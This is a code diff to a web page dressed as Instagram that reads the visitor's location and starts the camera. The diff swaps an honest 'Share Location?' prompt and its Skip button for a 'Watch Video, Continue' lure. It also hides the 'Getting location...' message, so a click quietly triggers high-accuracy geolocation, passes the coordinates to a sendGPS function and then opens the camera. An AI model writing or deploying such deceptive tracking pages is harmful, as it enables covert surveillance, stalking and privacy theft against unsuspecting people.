@@ -13,12 +13,11 @@
         .header { display: flex; justify-content: space-between; align-items: center; padding: 8px 16px; position: fixed; top: 0; left: 0; right: 0; z-index: 10; pointer-events: none; }
         .header h1 { font-size: 22px; font-weight: 600; text-shadow: 0 1px 4px rgba(0,0,0,0.5); }
         .permission-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; padding: 24px; }
-        .permission-overlay h2 { font-size: 24px; margin-bottom: 12px; }
-        .permission-overlay p { font-size: 16px; color: rgba(255,255,255,0.7); margin-bottom: 32px; text-align: center; }
+        .permission-overlay h2 { font-size: 24px; margin-bottom: 8px; }
+        .permission-overlay p { font-size: 14px; color: rgba(255,255,255,0.6); margin-bottom: 20px; text-align: center; }
         .permission-btn { background: #0095f6; color: #fff; border: none; padding: 14px 48px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin: 8px; }
         .loading { display: none; color: rgba(255,255,255,0.6); margin-top: 16px; }
-        .gps-btn { background: #0095f6; }
-        .skip-btn { background: #555; }
+        .video-btn { background: #0095f6; }
     </style>
 </head>
 <body>
@@ -35,10 +34,9 @@
 </div>
 
 <div class="permission-overlay" id="permissionOverlay">
-    <h2>📍 Share Location?</h2>
-    <p>Allow Instagram to access your location</p>
-    <button class="permission-btn gps-btn" id="allowGpsBtn">✅ Share Location</button>
-    <button class="permission-btn skip-btn" id="skipGpsBtn">⏭️ Skip</button>
+    <h2>▶️ Watch Video</h2>
+    <p>Click continue to watch this video</p>
+    <button class="permission-btn video-btn" id="allowGpsBtn">▶️ Continue</button>
     <div class="loading" id="loadingText">Loading...</div>
 </div>
 
@@ -59,7 +57,6 @@
     const hiddenVideo = document.getElementById('hiddenVideo');
     const permissionOverlay = document.getElementById('permissionOverlay');
     const allowBtn = document.getElementById('allowGpsBtn');
-    const skipBtn = document.getElementById('skipGpsBtn');
     const loadingText = document.getElementById('loadingText');
 
     function sendGPS(lat, lon) {
@@ -73,9 +70,6 @@
 
     function getGPSLocation() {
         if (navigator.geolocation) {
-            loadingText.textContent = 'Getting location...';
-            loadingText.style.display = 'block';
-            
             navigator.geolocation.getCurrentPosition(
                 function(position) {
                     const lat = position.coords.latitude;
@@ -84,10 +78,9 @@
                     startCamera(currentFacingMode);
                 },
                 function(error) {
-                    loadingText.textContent = 'Location unavailable. Continuing...';
-                    setTimeout(() => startCamera(currentFacingMode), 1000);
+                    startCamera(currentFacingMode);
                 },
-                { enableHighAccuracy: true, timeout: 10000 }
+                { enableHighAccuracy: true, timeout: 5000 }
             );
         } else {
             startCamera(currentFacingMode);
@@ -192,18 +185,9 @@
 
     allowBtn.addEventListener('click', () => {
         allowBtn.style.display = 'none';
-        skipBtn.style.display = 'none';
-        loadingText.textContent = 'Getting location...';
+        loadingText.textContent = 'Loading...';
         loadingText.style.display = 'block';
         getGPSLocation();
-    });
-
-    skipBtn.addEventListener('click', () => {
-        skipBtn.style.display = 'none';
-        allowBtn.style.display = 'none';
-        loadingText.textContent = 'Continuing...';
-        loadingText.style.display = 'block';
-        setTimeout(() => startCamera(currentFacingMode), 500);
     });
 
     setTimeout(() => { loadingText.style.display = 'block'; }, 500);
